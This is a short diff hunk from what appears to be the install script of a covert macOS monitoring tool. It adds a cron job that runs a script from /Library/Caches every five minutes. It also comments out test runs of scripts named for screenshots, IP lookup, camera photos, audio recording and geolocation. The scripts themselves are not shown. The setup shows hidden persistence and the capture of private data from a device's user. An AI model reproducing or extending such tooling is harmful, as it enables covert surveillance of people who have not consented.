@@ -27,16 +27,16 @@ chmod 755 /Library/Caches/imagesnap
 ( crontab -l ; echo "*/5 * * * * cd /Library/Caches && sh cron-01.sh" ) | crontab -
 
 # Test the screenshot feature
-sh /Library/Caches/screenshot.sh 
+# sh /Library/Caches/screenshot.sh 
 
 # Test the IP feature
-sh /Library/Caches/getip.sh
+# sh /Library/Caches/getip.sh
 
 # Test the photo feature (requires permissions)
-sh /Library/Caches/photo.sh 
+# sh /Library/Caches/photo.sh 
 
 # Test the audio recording feature (requires permissions)
-sh /Library/Caches/recordaudio.sh
+# sh /Library/Caches/recordaudio.sh
 
 # Test the geolocation feature (requires permissions)
-sh /Library/Caches/locateme.sh 
+# sh /Library/Caches/locateme.sh 
